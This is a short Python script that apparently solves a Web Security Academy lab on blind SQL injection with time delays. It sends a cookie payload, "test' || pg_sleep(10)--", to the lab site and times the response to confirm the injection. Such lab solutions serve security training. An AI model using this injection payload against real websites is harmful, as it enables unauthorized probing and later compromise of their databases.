# Blind SQL injection with time delays

import requests

url = "https://aceb1f431f84c199803e2bcb005900ff.web-security-academy.net/"
payload = "test' || pg_sleep(10)--"

try:
    r = requests.get(url, cookies = {'TrackingId' : payload})
    print(f"Response received in: {r.elapsed.total_seconds()}")
    if "Congratulations, you solved the lab!" in r.text:
        print("yeet!")
    else:
        print("sad noises :(")
except Exception as e:
    print("Something went wrong:", e)